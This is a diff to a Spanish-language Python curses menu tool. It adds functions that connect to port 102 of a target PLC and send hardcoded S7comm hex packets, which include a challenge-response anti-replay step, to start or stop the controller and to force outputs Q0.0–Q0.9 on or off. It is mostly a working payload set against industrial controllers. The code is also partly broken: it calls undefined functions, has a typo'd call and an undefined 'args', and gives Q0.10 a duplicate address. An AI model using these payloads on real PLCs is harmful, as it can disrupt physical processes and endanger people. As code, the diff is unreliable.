@@ -17,6 +17,132 @@
 
 import curses
 import time
+import socket
+import argparse
+
+def fConectar(host):
+  print(f"\n  Conectando a {host} en el puerto 102... \n")
+  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  s.settimeout(10)
+  try:
+    s.connect((host, 102))
+    print("\n  Conexión establecida. \n")
+    return s
+  except socket.error as e:
+    print(f"\n Error al conectar con el PLC: {e} \n")
+    return None
+
+def fEnviarPayload(payload, con):
+  print(f"\n Enviando: {payload} \n")
+  con.send(bytearray.fromhex(payload))
+  try:
+    data = con.recv(1024)
+    if data:
+      print(f"\n  Respuesta cruda del PLC: {data.hex()} \n")
+    else:
+      print("\n  No se recibió respuesta del PLC. \n")
+    return data
+  except socket.timeout:
+    print("\n  Error: El PLC no respondió en el tiempo esperado. \n")
+    return None
+
+def fEncenderPLC(host):
+  s = conectar(host)
+  if not s:
+    return
+
+  COTP_RQ = '030000231ee00000006400c1020600c20f53494d415449432d524f4f542d4553c0010a'
+  S7_COMM_RQ = '030000ee02f080720100df31000004ca0000000100000120360000011d00040000000000a1000000d3821f0000a3816900151553657276657253657373696f6e5f31433943333846a38221001532302e302e302e303a305265616c74656b20555342204762452046616d696c7920436f6e74726f6c6c65722e54435049502e33a38228001500a38229001500a3822a0015194445534b544f502d494e414d4455385f313432323331343036a3822b000401a3822c001201c9c38fa3822d001500a1000000d3817f0000a38169001515537562736372697074696f6e436f6e7461696e6572a2a20000000072010000'
+  vPayloadEncender = '0300004302f0807202003431000004f200000010000003ca3400000034019077000803000004e88969001200000000896a001300896b00040000000000000072020000'
+
+  fEnviarPayload(COTP_RQ, s)
+  data = fEnviarPayload(S7_COMM_RQ, s)
+  if not data:
+    s.close()
+    return
+  challenge = data.hex()[48:50]
+  anti = int(challenge, 16) + int("80", 16)
+  vPayloadEncender = vPayloadEncender[:46] + hex(anti)[2] + vPayloadEncender[47:]
+  vPayloadEncender = vPayloadEncender[:47] + hex(anti)[3] + vPayloadEncender[48:]
+  fEnviarPayloadv(PayloadEncender, s)
+  print("\n  PLC iniciado correctamente \n.")
+  s.close()
+
+def fApagarPLC(host):
+  s = conectar(host)
+  if not s:
+    return
+
+  COTP_RQ = '030000231ee00000006400c1020600c20f53494d415449432d524f4f542d4553c0010a'
+  S7_COMM_RQ = '030000ee02f080720100df31000004ca0000000100000120360000011d00040000000000a1000000d3817f0000a38169001515537562736372697074696f6e436f6e7461696e6572a2a20000000072010000'
+  vPayloadApagar = '0300004302f0807202003431000004f200000010000003ca3400000034019077000801000004e88969001200000000896a001300896b00040000000000000072020000'
+
+  fEnviarPayload(COTP_RQ, s)
+  data = fEnviarPayload(S7_COMM_RQ, s)
+  if not data:
+    s.close()
+    return
+  challenge = data.hex()[48:50]
+  anti = int(challenge, 16) + int("80", 16)
+  vPayloadApagar = vPayloadApagar[:46] + hex(anti)[2] + vPayloadApagar[47:]
+  vPayloadApagar = vPayloadApagar[:47] + hex(anti)[3] + vPayloadApagar[48:]
+  fEnviarPayload(vPayloadApagar, s)
+  print("\n  PLC detenido correctamente. \n")
+  s.close()
+
+def fEncenderSalida(host, salida, nombre):
+  s = conectar(host)
+  if not s:
+    return
+
+  COTP_RQ = '0300001611e00000cfc400c0010ac1020100c2020101'
+  S7_COMM_RQ = '0300001902f08032010000000000080000f0000008000803c0'
+  comandos = {
+    'Q0.0': '0300002502f08032010000001f000e00060501120a10010001000082000000000300010100',
+    'Q0.1': '0300002502f08032010000001f000e00060501120a10010001000082000001000300010100',
+    'Q0.2': '0300002502f08032010000001f000e00060501120a10010001000082000002000300010100',
+    'Q0.3': '0300002502f08032010000001f000e00060501120a10010001000082000003000300010100',
+    'Q0.4': '0300002502f08032010000001f000e00060501120a10010001000082000004000300010100',
+    'Q0.5': '0300002502f08032010000001f000e00060501120a10010001000082000005000300010100',
+    'Q0.6': '0300002502f08032010000001f000e00060501120a10010001000082000006000300010100',
+    'Q0.7': '0300002502f08032010000001f000e00060501120a10010001000082000007000300010100',
+    'Q0.8': '0300002502f08032010000001f000e00060501120a10010001000082000008000300010100',
+    'Q0.9': '0300002502f08032010000001f000e00060501120a10010001000082000009000300010100',
+    'Q0.10': '0300002502f08032010000001f000e00060501120a10010001000082000001000300010100'
+  }
+
+  for cmd in [COTP_RQ, S7_COMM_RQ, comandos[salida]]:
+    fEnviarPayload(cmd, s)
+
+  print(f"\n  Salida {nombre} activada correctamente. \n")
+  s.close()
+
+def fApagarSalida(host, salida, nombre):
+  s = conectar(host)
+  if not s:
+    return
+
+  COTP_RQ = '0300001611e00000cfc400c0010ac1020100c2020101'
+  S7_COMM_RQ = '0300001902f08032010000000000080000f0000008000803c0'
+  comandos = {
+    'Q0.0': '0300002502f08032010000001f000e00060501120a10010001000082000000000300010000',
+    'Q0.1': '0300002502f08032010000001f000e00060501120a10010001000082000001000300010000',
+    'Q0.2': '0300002502f08032010000001f000e00060501120a10010001000082000002000300010000',
+    'Q0.3': '0300002502f08032010000001f000e00060501120a10010001000082000003000300010000',
+    'Q0.4': '0300002502f08032010000001f000e00060501120a10010001000082000004000300010000',
+    'Q0.5': '0300002502f08032010000001f000e00060501120a10010001000082000005000300010000',
+    'Q0.6': '0300002502f08032010000001f000e00060501120a10010001000082000006000300010000',
+    'Q0.7': '0300002502f08032010000001f000e00060501120a10010001000082000007000300010000',
+    'Q0.8': '0300002502f08032010000001f000e00060501120a10010001000082000008000300010000',
+    'Q0.9': '0300002502f08032010000001f000e00060501120a10010001000082000009000300010000',
+    'Q0.10': '0300002502f08032010000001f000e00060501120a10010001000082000001000300010000'
+  }
+
+  for cmd in [COTP_RQ, S7_COMM_RQ, comandos[salida]]:
+    fEnviarPayload(cmd, s)
+
+  print(f"\n  Salida {nombre} activada correctamente. \n")
+  s.close()
 
 def accion_opcion_1(stdscr):
   stdscr.clear()
@@ -93,45 +219,45 @@ def main(stdscr):
       if menu[current_row] == "Salir":
         break
       elif menu[current_row] == "Encendiendo salida 0":
-        accion_opcion_1(stdscr)
+        fEncenderSalida(args.host, 'Q0.0', 'x')
       elif menu[current_row] == "Apagando salida 0":
-        accion_opcion_2(stdscr)
+        fApagarSalida(args.host, 'Q0.0', 'x')
       elif menu[current_row] == "Encendiendo salida 1":
-        accion_opcion_1(stdscr)
+        fEncenderSalida(args.host, 'Q0.1', 'x')
       elif menu[current_row] == "Apagando salida 1":
-        accion_opcion_2(stdscr)
+        fApagarSalida(args.host, 'Q0.1', 'x')
       elif menu[current_row] == "Encendiendo salida 2":
-        accion_opcion_1(stdscr)
+        fEncenderSalida(args.host, 'Q0.2', 'x')
       elif menu[current_row] == "Apagando salida 2":
-        accion_opcion_2(stdscr)
+        fApagarSalida(args.host, 'Q0.2', 'x')
       elif menu[current_row] == "Encendiendo salida 3":
-        accion_opcion_1(stdscr)
+        fEncenderSalida(args.host, 'Q0.3', 'x')
       elif menu[current_row] == "Apagando salida 3":
-        accion_opcion_2(stdscr)
+        fApagarSalida(args.host, 'Q0.3', 'x')
       elif menu[current_row] == "Encendiendo salida 4":
-        accion_opcion_1(stdscr)
+        fEncenderSalida(args.host, 'Q0.4', 'x')
       elif menu[current_row] == "Apagando salida 4":
-        accion_opcion_2(stdscr)
+        fApagarSalida(args.host, 'Q0.4', 'x')
       elif menu[current_row] == "Encendiendo salida 5":
-        accion_opcion_1(stdscr)
+        fEncenderSalida(args.host, 'Q0.5', 'x')
       elif menu[current_row] == "Apagando salida 5":
-        accion_opcion_2(stdscr)
+        fApagarSalida(args.host, 'Q0.5', 'x')
       elif menu[current_row] == "Encendiendo salida 6":
-        accion_opcion_1(stdscr)
+        fEncenderSalida(args.host, 'Q0.6', 'x')
       elif menu[current_row] == "Apagando salida 6":
-        accion_opcion_2(stdscr)
+        fApagarSalida(args.host, 'Q0.6', 'x')
       elif menu[current_row] == "Encendiendo salida 7":
-        accion_opcion_1(stdscr)
+        fEncenderSalida(args.host, 'Q0.7', 'x')
       elif menu[current_row] == "Apagando salida 7":
-        accion_opcion_2(stdscr)
+        fApagarSalida(args.host, 'Q0.7', 'x')
       elif menu[current_row] == "Encendiendo salida 8":
-        accion_opcion_1(stdscr)
+        fEncenderSalida(args.host, 'Q0.8', 'x')
       elif menu[current_row] == "Apagando salida 8":
-        accion_opcion_2(stdscr)
+        fApagarSalida(args.host, 'Q0.8', 'x')
       elif menu[current_row] == "Encendiendo salida 9":
-       accion_opcion_1(stdscr)
+        fEncenderSalida(args.host, 'Q0.9', 'x')
       elif menu[current_row] == "Apagando salida 9":
-        accion_opcion_2(stdscr)
+        fApagarSalida(args.host, 'Q0.9', 'x')
 
 
   # Mensaje final antes de salir
@@ -141,4 +267,3 @@ def main(stdscr):
 
 if __name__ == "__main__":
   curses.wrapper(main)
-
